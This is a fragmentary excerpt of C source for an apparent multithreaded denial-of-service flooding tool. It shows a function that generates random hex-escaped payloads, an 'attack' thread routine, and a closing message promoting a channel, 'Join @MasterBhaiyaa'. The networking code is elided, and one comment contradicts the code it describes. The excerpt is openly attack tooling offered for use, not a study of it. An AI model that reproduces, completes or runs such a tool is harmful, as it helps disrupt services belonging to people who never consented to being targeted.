...
#define PAYLOAD_SIZE 20 // Length of the payload
...
void generate_payload(char *buffer, size_t size) {
    for (size_t i = 0; i < size; i++) {
        // Each byte is represented as \xHH, so we need 2 characters for each byte
        buffer[i * 4] = '\\';
        buffer[i * 4 + 1] = 'x';
        buffer[i * 4 + 2] = "0123456789abcdef"[rand() % 16]; // First hex digit
        buffer[i * 4 + 3] = "0123456789abcdef"[rand() % 16]; // Second hex digit
    }
    buffer[size * 4] = '\0'; // Null-terminate the string
}
...
void *attack(void *arg) {
    ...
    // Create a new random payload for each thread
    char payload[PAYLOAD_SIZE * 4 + 1]; // 4 chars for each byte plus null terminator
...
int main(int argc, char *argv[]) {
    ...
    free(thread_ids);
    free(thread_data_array);
    printf("Attack finished. Join @MasterBhaiyaa\n");
    return 0;
}
